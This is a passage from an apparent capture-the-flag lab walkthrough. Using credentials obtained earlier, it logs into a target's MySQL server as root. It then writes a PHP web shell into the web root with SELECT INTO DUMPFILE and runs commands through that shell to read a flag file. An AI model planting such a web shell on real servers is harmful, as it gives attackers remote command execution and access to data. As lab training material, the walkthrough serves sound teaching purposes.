`sessions -i 2`

<span style="color: #64b5f6;">**Target 2 machine**</span>.

_Connect to the remote MySQL service using the credentials obtained earlier._

`mysql -h 192.56.119.3 -u root -p`:
```
Enter password: fArFLP29UySm4bZj ←

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 45
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

_Use SQL injection to write a PHP backdoor to the web server's directory._

`SELECT '<?php echo system($_GET["cmd"]); ?>' into DUMPFILE '/var/www/html/webtemp/backdoor.php';`:
```
Query OK, 1 row affected (0.00 sec) ←
```

<span style="color: #64b5f6;">**Target 3 machine**</span>.

_Execute a command to check the user running the web server using the PHP backdoor._

`http://localhost:1234/webtemp/backdoor.php?cmd=whoami`:
```
www-data ←
```

_List the contents of the parent directory to find any interesting files._

`http://localhost:1234/webtemp/backdoor.php?cmd=ls%20../`:
```
FLAG2 backdoor.php index.html webtemp ←
```

_Retrieve the contents of the second flag by reading the file using the backdoor._

`http://localhost:1234/webtemp/backdoor.php?cmd=cat%20../FLAG2`:
```
4c537c0dfd18bafdcd59f53c7015550e ←
```

---
---
